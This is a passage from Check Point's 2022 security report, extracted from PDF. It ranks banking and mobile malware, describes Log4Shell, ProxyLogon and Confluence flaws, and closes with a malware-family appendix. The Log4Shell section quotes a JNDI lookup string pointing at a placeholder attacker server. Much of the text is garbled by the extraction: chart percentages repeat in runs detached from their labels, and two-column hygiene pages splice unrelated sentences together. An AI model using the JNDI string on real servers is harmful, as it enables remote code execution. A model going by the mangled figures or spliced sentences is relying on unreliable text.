a pirated copy ofWindows as legitimate. When a user downloads a compromised version of the tool,CryptoBot is silently installed using background processes. Similar to LemonDuck,CyptoBot was previously detected utilizing the EternalBlue exploit as part of itsinfection chain.4949CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R5TOP BANKING TROJANSGLOBALAMERICAS21%21%TrickBot21%21%8%Qbot
7%
TrickBot
Dridex
7%
Qbot
Ursnif
Dridex
Ramnit
Ursnif
IcedID
Ramnit
Other
IcedID8%Other7%7%8%8%8%8%8%12%8%12%TrickBotQbot
TrickBot
Dridex
Qbot
Ursnif
Dridex
Ramnit
Ursnif
IcedID
Ramnit
Other
IcedIDOther30%30%30%30%14%14%14%12%
14%12%TrickBotDridex
TrickBot
Qbot
Dridex
Ursnif
Qbot
IcedID
Ursnif
Zloader
IcedID
Other
ZloaderOtherTrickBot
5%
Dridex
TrickBot
Qbot
7%
5%
Dridex
Ursnif
Qbot
IcedID
Ursnif
Zloader
IcedID
Other
Zloader7%Other9%9%21%21%21%21%5%7%
5%36%36%36%36%9%7%
11%9%11%11%
11%
11%
11%11%11%Figure 26: Most prevalent banking Trojans globallyFigure 27: Most prevalent banking Trojans in the AmericasEUROPE, MIDDLE EAST AND AFRICA (EMEA)ASIA PACIFIC (APAC)22%TrickBot22%22%22%26%26%Qbot
5%
TrickBot
Dridex
7%
5%
Qbot
IcedID
Dridex
Ursnif
7%
IcedID
Ramnit
Ursnif
Other
Ramnit8%8%Other5%7%
5%8%7%
13%8%13%19%13%19%13%TrickBotQbot
TrickBot
Dridex
Qbot
IcedID
Dridex
Ursnif
IcedID
Ramnit
Ursnif
Other
RamnitOther26%26%19%19%TrickBotRamnit
TrickBot
Dridex
Ramnit
Ursnif
Dridex
Qbot
Ursnif
IcedID
Qbot
Other
IcedIDOther21%21%21%21%TrickBot
4%Ramnit
TrickBot
7%
Dridex
4%
Ramnit
Ursnif
Dridex
Qbot
Ursnif
IcedID
Qbot
Other
IcedID7%Other10%10%4%7%
4%7%10%11%10%11%31%31%31%31%16%
11%
16%
11%16%16%Figure 28: Most prevalent banking Trojans in EMEAFigure 29: Most prevalent banking Trojans in APAC5050CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R5BANKING TROJANS GLOBAL ANALYSISThe banking malware landscape continues to be dominated by a collection ofstealthy, adaptive malware families over the past few years. TrickBot climbed fromsecond place to the top of the global ranks, while Dridex fell from first place tothird, and is down by almost 60% compared to 2020\.Qbot is an ever\-evolving banking malware initially designed to collect bankingcredentials and keystrokes. It features worm capabilities but also functions asa botnet, often used by ransomware campaigns to drop malware on infecteddevices. In September, Qbot resumed its operations following a three\-monthbreak, executing a large\-scale spam campaign that leveraged the malware as abotnet and infostealer and distributed the SquirrelWaffle malware loader. Therecent campaign relied on Visual Basic and Excel 4\.0 macros. In November, themonetization stage of the campaign was observed, as the malware dropper beganinstalling the Conti Ransomware.Dridex, yet another banking malware that now features infostealer and botnetcapabilities, showed a significant decrease this year. However, in Septemberresearchers detected a new Dridex variant, with extended information collectioncapabilities, spreading in a phishing campaign that features specially crafted Exceldocuments. In addition, in December, Dridex was among the first malware to bedistributed in a campaign that exploits the Log4j vulnerability for infection.5151CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R5TOP MOBILE MALWAREGLOBALAMERICAS34%34%HiddadHiddad34%34%29%29%29%29%xHelper
Hiddad
AlienBot
xHelper
FluBot
AlienBot
Other
FluBotOtherxHelper
Hiddad
AlienBot
xHelper
FluBot
AlienBot
Other
FluBot7%7%Other7%13%7%13%17%13%17%13%17%17%20%20%20%20%2%2%HiddadxHelper
Hiddad
AlienBot
xHelper
FluBot
AlienBot
Other
FluBotOtherHiddad2%
16%16%xHelper
Hiddad
AlienBot
xHelper
FluBot
AlienBot
Other
FluBotOther2%
16%16%
18%18%18%18%44%44%44%44%Figure 30: Top mobile malware globallyFigure 31: Top mobile malware in the AmericasEUROPE, MIDDLE EAST AND AFRICA (EMEA)ASIA PACIFIC (APAC)26%26%26%26%39%39%14%14%11%14%14%10%11%10%10%11%10%11%39%39%
HiddadxHelper
Hiddad
AlienBot
xHelper
FluBot
AlienBot
Other
FluBotOtherHiddadxHelper
Hiddad
AlienBot
xHelper
FluBot
AlienBot
Other
FluBotOther40%xHelper40%Hiddad
xHelper
AlienBot
Hiddad
FluBot
AlienBot
Other
FluBotOtherxHelperHiddad
xHelper
AlienBot
Hiddad
FluBot
AlienBot
Other
FluBotOther30%30%30%30%40%40%3%3%3%3%11%11%16%11%
16%11%16%16%Figure 32: Top mobile malware in EMEAFigure 33: Top mobile malware in APAC5252CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R5MOBILE MALWARE GLOBAL ANALYSISHiddad, an Android malware designed to display ads, previously leveraged theCovid\-19 theme and maintained its place at the top of the ranks, together withxHelper, whose share of the malware pie decreased by 25% compared to 2020\.This year, two other malware families made it to the chart for the first time, joinedby two brand new malware families: AlienBot and FluBot.AlienBot is an Android banking malware distributed by threat actors as Malware\-as\-a\-Service. The malware enables an attacker to remotely inject arbitrary codeinto legitimate financial applications, thus gain access to the victims' financialaccounts and eventually completely control their device. In March, Check PointResearch detected a new dropper called Clast82 distributed via the Google PlayStore that installs AlienBot on victims machines. The dropper utilizes a number oftechniques to avoid detection by Google Play Protect. For example, non\-maliciouspayload is dropped during the evaluation period, and after it passes, the payload ischanged to AlienBot.FluBot, another Android banking malware, emerged in late 2020, targetingEuropean users and spreading via SMS messages sent from infected devices.FluBot campaigns rely on creative themes; a campaign that targeted Finnishusers in June and November leveraged a voicemail theme, asking its victims froma mobile carriers link to listen to messages. Ironically, a campaign aimed atNew Zealand users features a fake security update warning the victims ofFluBot infections.5353CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R606HIGH PROFILE
GLOBAL 
VULNERABILITIES MANY VULNERABILITIES DISCOVERED IN 2017 MAINTAINEDA STRONG PRESENCE THROUGHOUT 2021 OVERSHADOWINGTHE NEWLY DISCOVERED ONES5454CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R6The following list of top vulnerabilities is based on data collected by the CheckPoint Intrusion Prevention System (IPS) sensor net and details some of the mostpopular and interesting attack techniques and exploits observed by Check Pointresearchers in 2021\.LOG4SHELL APACHE LOG4J\- REMOTE CODE
EXECUTION (CVE\-2021\-44228\)Apache Log4j is an open\-source Java\-based logging package provided by theApache Software Foundation, as part of the Apache Logging Services. It is themost popular Java logging library, used by millions of Java\-based applicationsworldwide to record activities such as routine system operations and errormessages and to send diagnostics to system admins. On December 9, the ApacheFoundation released an emergency Log4j version to address a critical flaw in thelogging framework. This flaw enables threat actors to compromise a machine bysending it a simple string such as ${jndi:ldap:attacker\_serverpath} as part ofthe HTTP request, User\-Agent or any other input likely being logged by the serverusing Log4j. By controlling the messages logged via the logging package, arbitrarycode could be executed from a remote server. Called Log4Shell, the vulnerabilitytook the security community by storm due to its far\-reaching effects on millionsof companies, including Cisco, Twitter, Cloudflare, Tesla, Amazon and Apple, thatuse Log4j. Widespread exploitation of the flaw was observed almost immediately,both by low skilled attackers to distribute cryptominers, as well as by statesponsored APT groups, to gain access to corporate networks. According to CheckPoint Research approximately 48\.3% of organizations were affected by exploitationattempts of the Log4Shell Vulnerability in 2021\.5555CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R6PROXYLOGON MICROSOFT EXCHANGE SERVER\- 
AUTHENTICATION BYPASS (CVE\-2021\-26855\)ProxyLogon is the name given by researchers from DEVCORE to an authenticationbypass vulnerability (CVE\-2021\-26855\) first discovered and reported in late 2020\.When combined with other vulnerabilities (CVE\-2021\-26857, CVE\-2021\-26858,CVE\-2021\-27065\), this infection chain can lead to remote code execution on anyunpatched mainstream Exchange Server. ProxyLogon has been exploited in thewild by several APT groups. In August, Earth Baku launched a campaign in theIndo\-Pacific region using SQL injection and exploiting ProxyLogon as entry vectors.In September, the FamousSparrow cyberespionage group exploited the flaw as wellas backdoor SparrowDoor on hotel chains, governments, private businesses andvarious other sectors worldwide. Another threat group, SquirrelWaffle, was seenhacking Microsoft Exchange servers with ProxyShell and ProxyLogon to spreadmalware through malicious emails.ATLASSIAN CONFLUENCE\- REMOTE CODE
EXECUTION (CVE\-2021\-26084\)This critical Remote Code Execution in Atlassian Confluence Server or ConfluenceData Center flaw, made public in August 2021, is derived from the Object GraphNavigation Language. It can be exploited without authentication, allowing aremote attacker to execute arbitrary code on the affected system. Atlassianreleased patches for the affected enterprises and several Proof of Concept exploitswere published. Threat actors subsequently scanned for the vulnerability with theaim of installing cryptominers. In September, the z0Miner cryptojacker attemptedto conduct mining operations on vulnerable machines. In October, the Atom Siloransomware operator was observed exploiting unpatched computers to launchransomware attacks.5656CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R6202120202019201820172016201520142013201220112%5%11%12%17%7%8%8%6%10%3%Earlier11%10
Figure 34: Percentage of attacks leveraging vulnerabilities by Disclosure Year in 2021\.201505Many vulnerabilities discovered in 2017 maintained a strong presence throughout2021\. This is mostly due to popular flaws like the Apache Struts2 Remote CodeExecution (CVE\-2017\-5638\), which is incorporated into the Mirai botnet, or thePHPUnit remote code execution (CVE\-2017\-9841\), often used to exploit vulnerableWordPress plugins.The 2020 vulnerabilities remained prominent, leveraged in 11% of attacks. Amongthe most significant was the Draytek Vigor series buffer overflow vulnerabilities(CVE\-2020\-10826, CVE\-2020\-10827, CVE\-2020\-10828\), which had a 41% share ofglobal impact on organizations. These vulnerabilities could be leveraged to runarbitrary code on vulnerable Draytek routers, using a specially crafted remoteHTTP request.In 2021, we observed a slower adaptation of vulnerabilities compared to previousyears. The chart reveals that 2021 vulnerabilities were increasingly exploited by5757CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022100%90%80%70%60%50%40%30%20%10%0%JAN 2 1F EB 2 1A R 2 1MA PR 2 1M AY 2 1N 2 1J UJ UL 2 1A UG 2 1S EP 2 1O CT 2 1O V 2 1ND EC 2 1Figure 35: Percentage of attacks leveraging vulnerabilities by Disclosure Year per Month.hackers from the middle of the year, corresponding with a slight decrease in the useof CVEs from 2017\.20212020201920182017201620152014201320122011Older5858CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022 
CHAPTE R707PREVENTING THE
NEXT CYBER PANDEMIC
A STRATEGY FOR 
ACHIEVING BETTER 
SECURITYBY JONY FISCHBEINCISO for Check Point Software59CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R7THREAT PREVENTION PREVENT ATTACKS
BEFORE THEY HAPPENOne of the biggest challenges facing security practitioners is Gen V attacks thecombination of a wide breadth of threats, large scale attacks and a broad attacksurface. True comprehensive protection requires an architected approach thatprevents attacks before they happen. Ultimately, the goal is to defeat all attacksacross all possible vectors. A security architecture that enables and facilitatesa unified and cohesive protection infrastructure is going to provide morecomprehensive and faster protection than an infrastructure composed of piecesthat dont work together. This is the heart of what Check Point Infinity delivers asecurity architecture to prevent attacks before they occur.WHEN YOUR PERIMETER IS EVERY WHERE AND 
ATTACKS KEEP ADVANCING, YOUR BUSINESS 
NEEDS ACCURATE PREVENTION BASED ON REAL 
TIME THREAT INTELLIGENCEIn the current climate of mega supply chain attacks and the constant fight againstnew evolved malware, threat intelligence and rapid response capabilities are vital.Comprehensive intelligence to proactively eliminate threats, managed securityservices to monitor your network, and incident response capabilities to quicklyrespond to and resolve attacks, are all crucial to keeping your business up andrunning in 2022\. Malware is constantly evolving, making threat intelligence anessential tool for almost every company to consider. When an organization hasfinancial, personal, intellectual, or national assets to maintain and secure, a morecomprehensive approach to security is the only actual way to protect againsttodays attackers \- and one of the most effective proactive security solutionsavailable today is threat intelligence. Threat intelligence must cover all attacksurfaces including cloud, mobile, network, endpoint, and IoT, because thesevectors are commonplace in an enterprise. Threat intelligence isnt just data \- itspractice, and it should fuel the move toward a prevention\-first approach, blockingattacks before they penetrate, gaining the best catch rate of known and unknownthreats, and achieving a near zero false positive rate, interrupting users as littleas possible.6060CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R7SECURE EVERYTHING, AS EVERYTHING IS A 
POTENTIAL TARGETTo achieve effective coverage, organizations should seek a single solution that cancover all attack surfaces and vectors. In a multi hybrid environment, where theperimeter is now everywhere, security should be able to protect it all.Email, web browsing, servers and storage are only the beginning. Mobile apps,cloud and external storage are all essential, so is the compliance of connectedmobile and endpoint devices, and your growing IoT device estate. Workloads,containers, and serverless applications on multi\- and hybrid\-cloud environmentsshould also be a part of the checklist at all times. With the rapid shift to cloudand hybrid working, its become even more important to have a robust breachprevention strategy.LEVERAGING A COMPLETE UNIFIED 
ARCHITECTUREComprehensive visibility across your entire network estate, gained throughconsolidation, is now essential when it comes to guarding against increasinglysophisticated attacks.Many companies attempt to build their security using a patchwork of single\-purpose products from multiple vendors, but often fail and are left with securitygaps caused by disjointed technologies. This approach also produces a hugeoverhead because it relies on working with multiple systems and vendors insteadof one integrated solution. In order to achieve complete inclusive security,companies should therefore adopt a unified multi\-layer approach that protects allIT elements, including networks, endpoints, cloud, mobile and IoT, all sharing thesame prevention architecture and being fed the same threat intelligence data inreal time.6161CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R7BIOLOGICAL PANDEMIC VS. CYBER PANDEMIC 
Similarities and Parallelization, Lessons LearnedBIOLOGICAL PANDEMICCYBER PANDEMICINFECTION RATE
Virus infection rate (Ro) (source: WHO)
The average number of people that one person 
with a virus infects:
Flu: 1\.3, SARS: 2\-4, Corona: 2\.5, 
Ebola: 1\.6\-2, Zika: 2\-6\.6, Measles: 11\-18INFECTION PREVENTION
Best treatment: Vaccination
Dealing with Infection Best Practices:
1\)Quarantine, Shelter\-in\-Place
2\)Isolation 
3\)Contact TracingSAFETY BEST PRACTICES
Common treatment (until vaccination):
1\)Mask
2\)Hygiene
3\)Social DistancingINFECTION RATE
Malware infection rate (Ro) The average number 
of hosts that one host with a malware infects:
Cyber attack: \>27 (source: WEF, NSTU) 
Slammer: Doubled in size every 8\.5 seconds 
Code Red: 2,000 new hosts per minuteINFECTION PREVENTION
Best treatment: Real Time Prevention
Best Practices: Continuous process of:
1\)Quarantine: Sandboxing, Micro\-Segmentation
2\)Isolation: Zero Trust, Segregation
3\)Tracing: Threat Intelligence, AI, SOC, 
Posture ManagementSAFETY BEST PRACTICES
1\)Awareness: Think before you click
2\)Cyber Hygiene: Patches, Compliance 
3\)Asset Distancing: Network Segmentation, 
Multi\-Factor AuthenticationMAINTAIN SECURITY 
HYGIENEPatching: All too often, attacks are able topenetrate defenses by leveraging knownvulnerabilities for which a patch exists buthas not been applied. Organizations shouldstrive to make sure up\-to\-date securitypatches are maintained across all systemsand software.Educate Employees to Recognize PotentialThreats: User education has always been akey element in avoiding malware infections.The basics of knowing where files camefrom, why the employee is receiving them,and whether or not they can trust the sendercontinue to be useful tools your employeesshould use before opening files and emails.The most common infection methods used inransomware campaigns are still spam andSegmentation: Networks should bephishing emails. Quite often, user awarenesssegmented, applying strong firewall and IPScan prevent an attack before it occurs. Takesafeguards between the network segments inthe time to educate your users, and ensureorder to contain infections from propagatingthat if they see something unusual, theyacross the entire network.report it to your security teams immediately.6262CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022C HAPTE R7Review: Security products policies mustnumerous more. Each of these technologiesbe carefully reviewed, and incident logs andcan be highly effective in specific scenarios,alerts should be continuously monitored.covering specific file types or attack vectors.Audit: Routine audits and penetration testingshould be conducted across all systems.Principle of Least Privilege: User andsoftware privileges should be kept to aminimum is there really a need for all usersto have local admin rights on their devices?Strong solutions integrate a wide range oftechnologies and innovations in order toeffectively combat modern attacks in ITenvironments. In addition to traditional,signature\-based protections like antivirusand IPS, organizations need to incorporateadditional layers to prevent against new,unknown malware that has no knownImplementing the most advanced securitysignature. Two key components to considertechnologies: There is no single silver\-are threat extraction (file sanitization) andbullet technology that can protect from allthreat emulation (advanced sandboxing). Eachthreats and all threat vectors. However,element provides distinct protection that,there are many great technologies and ideaswhen used together, offer a comprehensiveavailable machine learning, sandboxing,solution for protection against unknownanomaly detection, content disarmament, andmalware at the network level and directly onendpoint devices.6363CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022CONCLUSIONAs predicted, in a year that began with the fallout from one of the most devastatingsupply chain attacks in history, weve seen threat actors grow in confidence andsophistication. By the end of the year, this culminated in the Log4j vulnerabilityexploit, which yet again caught the security community off guard and brought tothe fore the sheer level of risk inherent to software supply chains. In the monthsbetween, we saw cloud services under attack, threat actors increasing their focuson mobile devices, the Colonial Pipeline held to ransom, and the resurgence of oneof the most dangerous botnets in history.But its not all doom and gloom. We also saw cracks in the ransomware ecosystemwiden in 2021, as governments and law enforcement agencies around the worldresolved to take a tougher stance on ransomware groups in particular. Instead ofrelying on reactive and remedial action, some shocking events woke governmentsup to the fact that they needed to take a more pre\-emptive, proactive approachto dealing with cyber risk. That same philosophy extends to businesses too, whocan no longer afford to take a disjointed, siloed, reactionary approach to dealingwith threats. They need 360\-degree visibility, real\-time threat intelligence, and asecurity infrastructure that can be mobilized in an effective, joined\-up manner.64CHECK POINT SOFTWARE\|SECURITY REPORT 2022APPENDIX
MALWARE FAMILY DESCRIPTIONSS6565CHECK POINT SOFTWARE\|SECURITY REPORT 2022CHECK POINT SOFTWARE\|SECURITY REPORT 2022AgentTesla 
AgentTesla is an advanced RAT which functions as a keylogger and password stealer 
and has been active since 2014\. AgentTesla can monitor and collect the victim's 
keyboard input and system clipboard, and can record screenshots and exfiltrate 
credentials for a variety of software installed on a victim's machine (including 
Google Chrome, Mozilla Firefox and Microsoft Outlook email client). AgentTesla is 
sold on various online markets and hacking forums.AlienBot 
AlienBot is a banking Trojan for Android, sold underground as Malware\-as\-a\-Service 
(MaaS). It supports keylogging, dynamic overlays for credentials theft, as well as 
SMS harvesting for 2FA bypass. Additional remote control capabilities are provided 
using a TeamViewer module.Bazar 
Discovered in 2020, Bazar Loader and Bazar Backdoor are used in the initial stages 
of infection by the WizardSpider cybercrime gang. The loader is responsible for 
fetching the next stages, and the backdoor is meant for persistence. The infections 
are usually followed by a full\-scale ransomware deployment, using Conti or Ryuk.CryptoBot 
CryptoBot is an advanced cryptominer that collects the victims wallet and account 
information upon infection. In December 2021 CryptoBot was observed in a 
campaign that targeted users with a pirated copy of the Windows operating system.Cl0p 
Cl0p is a ransomware that was first discovered in early 2019 and mostly targets 
large firms and corporations. During 2020, Cl0p operators began exercising a 
double\-extortion strategy, where in addition to encrypting the victim's data, the 
attackers also threaten to publish stolen information unless ransom demands are 
met. In 2021 Cl0p ransomware was used in numerous attacks where the initial 
access was gained by utilizing zero\-day vulnerabilities in the Accellion File Transfer 
Appliance.66CHECK POINT SOFTWARE\|SECURITY REPORT 2022DanaBot 
DanaBot is a modular banking Trojan written in Delphi that targets the Windows 
platform. The malware, which was first observed in 2018, is distributed via 
malicious spam emails. Once a device is infected, the malware downloads updated 
configuration code and other modules from the C\&C server. Available modules 
include a sniffer to intercept credentials, a stealer to steal passwords from 
popular applications, a VNC module for remote control, and more.DarkGate 
DarkGate is a multifunction malware active since December 2017 which combines 
ransomware, credential stealing, and RAT and cryptomining abilities. Targeting 
mostly the Windows OS, DarkGate employs a variety of evasion techniques.Dridex 
Dridex is a Banking Trojan turned botnet, that targets the Windows platform. It is 
delivered by spam campaigns and Exploit Kits, and relies on WebInjects to intercept 
and redirect banking credentials to an attacker\-controlled server. Dridex contacts a 
remote server, sends information about the infected system, and can also download 
and execute additional modules for remote control.Emotet 
Emotet is an advanced, self\-propagating and modular Trojan. Emotet was once used 
to employ as a banking Trojan, and now is used as a distributer for other malware 
or malicious campaigns. It uses multiple methods for maintaining persistence and 
evasion techniques to avoid detection. In addition, Emotet can also be spread through 
phishing spam emails containing malicious attachments or links.FluBot 
FluBot is an Android malware distributed via phishing SMS messages (SMiShing), 
most often impersonating logistics delivery brands. Once the user clicks the link 
inside the message, they are redirected to the download of a fake application 
containing FluBot. Once installed the malware has various capabilities to harvest 
credentials and support the Smishing operation itself, including uploading of the 
contacts list, as well as sending SMS messages to other phone numbers.67CHECK POINT SOFTWARE\|SECURITY REPORT 2022FlyTrap 
FlyTrap is an Android Trojan built to steal Facebook credentials, location, email 
address, IP and more. The Trojan originally spread via fake Android apps on Google 
Play, encouraging the users to login to their Facebook account. At this stage FlyTrap 
uses JavaScript injection to hijack the session, and sends its details to the C\&C 
server, allowing the attackers to gain access to the Facebook account, from a remote 
location.FormBook 
FormBook is an Infostealer targeting the Windows OS and was first detected in 2016\. 
It is marketed as Malware\-as\-a\-service (MaaS) in underground hacking forums 
for its strong evasion techniques and relatively low price. FormBook harvests 
credentials from various web browsers, collects screenshots, monitors and logs 
keystrokes, and can download and execute files according to orders from its C\&C.Glupteba 
Known since 2011, Glupteba is a Windows backdoor which gradually matured into a 
botnet. By 2019 it included a C\&C address update mechanism through public BitCoin 
lists, an integral browser stealer capability and a router exploiter.Hiddad 
Android malware which repackages legitimate apps and then releases them to a 
third\-party store. Its main function is displaying ads, but it also can gain access to 
key security details built into the OS.IcedID 
IcedID is a banking Trojan which first emerged in September 2017\. It spreads by mail 
spam campaigns and often uses other malwares like Emotet to help it proliferate. 
IcedID uses evasive techniques like process injection and steganography, and steals 
user financial data via both redirection attacks (installs a local proxy to redirect 
users to fake\-cloned sites) and web injection attacks.Kinsing 
Discovered in 2020, Kinsing is a Golang cryptominer with a rootkit component. 
Originally designed to exploit Linux systems, Kinsing was installed on compromised 
servers by abusing vulnerabilities on internet facing services. Later in 2021 a 
Windows variant of the malware was developed as well, allowing the attackers to 
increase their attack surface.68CHECK POINT SOFTWARE\|SECURITY REPORT 2022LemonDuck 
LemonDuck is a cryptominer first discovered in 2018, which targets Windows 
systems. It has advanced propagation modules, including sending malspam, RDP 
brute\-forcing and mass\-exploitation via known vulnerabilities such as BlueKeep. 
Over time it was observed to harvest emails and credentials, as well as to deliver 
other malware families, like Ramnit.LokiBot 
LokiBot is commodity infostealer for Windows. It harvests credentials from a variety 
of applications, web browsers, email clients, IT administration tools such as PuTTY, 
and more. LokiBot has been sold on hacking forums and believed to have had its 
source code leaked, thus allowing for a range of variants to appear. It was first 
identified in February 2016\.Mirai 
Mirai is an infamous Internet\-of\-Things (IoT) malware that tracks vulnerable IoT 
devices, such as web cameras, modems and routers, and turns them into bots. The 
botnet is used by its operators to conduct massive distributed denial\-of\-service 
(DDoS) attacks. The Mirai botnet first surfaced in September 2016 and quickly made 
headlines due to some large\-scale attacks including a massive DDoS attack used to 
knock the entire country of Liberia offline, and a DDoS attack against the Internet 
infrastructure firm Dyn, which provides a significant portion of the United States 
internet's infrastructure.MyloBot
Mylobot is a sophisticated botnet that first emerged in June 2018 and is equipped 
with complex evasion techniques including anti\-VM, anti\-sandbox, and anti\-
debugging techniques. The botnet allows an attacker to take complete control of the 
user's system, downloading any additional payload from its C\&C.NanoCore
NanoCore is a Remote Access Trojan that targets Windows operating system users 
and was first observed in the wild in 2013\. All versions of the RAT contain basic 
plugins and functionalities such as screen capture, cryptocurrency mining, remote 
control of the desktop and webcam session theft.69CHECK POINT SOFTWARE\|SECURITY REPORT 2022NRSMiner
NSRMiner is a cryptominer that surfaced around November 2018, and was mainly 
spread in Asia, specifically Vietnam, China, Japan and Ecuador. After the initial 
infection, it uses the famous EternalBlue SMB exploit to propagate to other 
vulnerable computers in internal networks and eventually starts mining the Monero 
(XMR) Cryptocurrency.Pegasus
Pegasus is a highly sophisticated spyware which targets Android and iOS mobile 
devices, developed by the Israeli NSO group. The malware is offered for sale, 
mostly to government\-related organizations and corporates. Pegasus can leverage 
vulnerabilities which allow it to silently jailbreak the device and install the malware. 
The malware infects its targets via several means: Spear phishing SMS messages 
which contains a malicious link or URL redirect, without any action required from 
the user (Zero Click), and more. The app features multiple spying modules such as 
screenshot taking, call recording, access to messaging applications, keylogging and 
browser history exfiltration.Phorpiex 
Phorpiex (aka Trik) is a botnet (aka Trik) that has been active since 2010 and at its 
peak controlled more than a million infected hosts. It is known for distributing other 
malware families via spam campaigns as well as fueling large\-scale spam and 
sextortion campaigns.Qbot 
Qbot AKA QakBot is a banking Trojan that first appeared in 2008\. It was designed to 
steal a users banking credentials and keystrokes. Often distributed via spam email, 
Qbot employs several anti\-VM, anti\-debugging, and anti\-sandbox techniques to 
hinder analysis and evade detection.Raccoon 
Raccoon infostealer was first observed in April 2019\. This infostealer targets 
Windows systems and is sold as a MaaS (Malware\-as\-a\-Service) in underground 
forums. It is a simple infostealer capable of collecting browser cookies, history, 
login credentials, cryptocurrency wallets and credit card information.Ragnar Locker 
Ragnar Locker is a ransomware first discovered in Dec. 2019\. It deploys 
sophisticated evasion techniques including deployment as a virtual machine on 
targeted systems to hide its activity. Ragnar was used in an attack against Portugals 
national electric company in a double\-extortion act where the attackers published 
sensitive data stolen from the victim.70CHECK POINT SOFTWARE\|SECURITY REPORT 2022Ramnit 
Ramnit is a modular banking Trojan first discovered in 2010\. Ramnit steals web 
session information, giving its operators the ability to steal account credentials for 
all services used by the victim, including bank accounts, and corporate and social 
networks accounts. The Trojan uses both hardcoded domains as well as domains 
generated by a DGA (Domain Generation Algorithm) to contact the C\&C server and 
download additional modules.RedLine Stealer 
RedLine Stealer is a trending Infostealer and was first observed in March 2020\. 
Sold as a MaaS (Malware\-as\-a\-Service), and often distributed via malicious email 
attachments, it has all the capabilities of modern infostealer \- web browser 
information collection (credit card details, session cookies and autocomplete data), 
harvesting of cryptocurrency wallets, ability to download additional payloads,
and more.Remcos 
Remcos is a RAT that first appeared in the wild in 2016\. Remcos distributes itself 
through malicious Microsoft Office documents, which are attached to SPAM emails, 
and is designed to bypass Microsoft Windowss UAC security and execute malware 
with high\-level privileges.RigEK
The oldest and best known of the currently operating Exploit Kits, RigEK has been 
around since mid\-2014\. Its services are offered for sale on hacking forums and the 
TOR Network. Some entrepreneurs even re\-sell low\-volume infections for those 
malware developers not yet big enough to afford the full\-fledged service. RigEK has 
evolved over the years to deliver anything from AZORult and Dridex to little\-known 
ransomware and cryptominers.RubyMiner
RubyMiner was first seen in the wild in January 2018 and targets both Windows and 
Linux servers. RubyMiner seeks vulnerable web servers (such as PHP, Microsoft 
IIS, and Ruby on Rails) to use for cryptomining, using the open source Monero miner 
XMRig.71CHECK POINT SOFTWARE\|SECURITY REPORT 2022Ryuk 
Ryuk is a ransomware used by the TrickBot gang in targeted and well\-planned 
attacks against several organizations worldwide. The ransomware was originally 
derived from the Hermes ransomware, whose technical capabilities are relatively 
low, and includes a basic dropper and a straight\-forward encryption scheme. 
Nevertheless, Ryuk was able to cause severe damage to targeted organizations, 
forcing them to pay extremely high ransom payments in Bitcoin. Unlike common 
ransomware, systematically distributed via massive spam campaigns and Exploit 
Kits, Ryuk is used exclusively in tailored attacks.Snake Keylogger 
Snake Keylogger is a modular .NET keyloggerinfostealer. Surfaced around late 
2020, it grew fast in popularity among cyber criminals. Snake is capable of recording 
keystrokes, taking screenshots, harvesting credentials and clipboard content. It 
supports exfiltration of the stolen data by both HTTP and SMTP protocols.REvil 
REvil (aka Sodinokibi) is a Ransomware\-as\-a\-service which operates an affiliates 
program and was first spotted in the wild in 2019\. REvil encrypts data in the users 
directory and deletes shadow copy backups to make data recovery more difficult. In 
addition, REvil affiliates use various tactics to spread it, including through spam and 
server exploits, as well as hacking into managed service providers (MSP) backends, 
and through malvertising campaigns that redirect to the RIG Exploit Kit.SparrowDoor 
SparrowDoor is an advanced backdoor used by the FamousSparrow APT group to spy 
on hotels, governments and more. It was spotted exploiting the Microsoft Exchange 
ProxyLogon vulnerability around March 2021\. The backdoor is loaded using DLL 
Hijacking combined with a legitimate binary, to help bypass AV products.SunBurst
SunBurst is the backdoor that was planted within SolarWindss Orion IT management 
software during 2020, as part of the infamous supply chain attack, hitting thousands 
of organizations worldwide. It is a persistent backdoor that provided attackers with 
an initial foothold within the organizations. If the infected machines passed all the 
requirements, and did not contain various blacklisted services or AV software, 
Sunburst would later deploy additional memory implants (like TearDrop) for 
command execution and lateral movement capabilities.72CHECK POINT SOFTWARE\|SECURITY REPORT 2022Triada
Triada which was first spotted in 2016, is a modular backdoor for Android which 
grants admin privileges to download another malware. Its latest version is 
distributed via adware development kits in WhatsApp for Android.TrickBot
TrickBot is a modular banking Trojan, attributed to the WizardSpider cybercrime 
gang. Mostly delivered via spam campaigns or other malware families such as 
Emotet and BazarLoader. TrickBot sends information about the infected system 
and can also download and execute arbitrary modules from a large array of 
available modules, including a VNC module for remote control and an SMB module 
for spreading within a compromised network. Once a machine is infected, the 
threat actors behind this malware, utilize this wide array of modules not only to 
steal banking credentials from the target PC, but also for lateral movement and 
reconnaissance on the targeted organization itself, prior to delivering a company\-
wide targeted ransomware attack.Ursnif 
Ursnif is a variant of the Gozi banking Trojan for Windows, whose source code 
has been leaked online. It has man\-in\-the\-browser capabilities to steal banking 
information and credentials for popular online services. In addition, it can steal 
information from local email clients, browsers and cryptocurrency wallets. Finally,
it can download and execute additional files on the infected system.Vidar 
